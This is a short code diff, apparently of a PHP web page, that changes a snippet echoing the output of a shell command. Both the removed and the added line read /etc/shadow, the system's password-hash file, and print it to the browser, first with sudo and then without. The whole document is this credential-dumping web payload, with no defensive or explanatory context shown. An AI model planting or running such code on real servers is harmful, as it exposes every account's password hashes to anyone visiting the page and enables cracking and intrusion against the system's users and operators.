@@ -1,3 +1,3 @@
+<pre>
 <?php
-  echo shell_exec('sudo cat /etc/shadow');
-?>
+echo shell_exec('cat /etc/shadow');
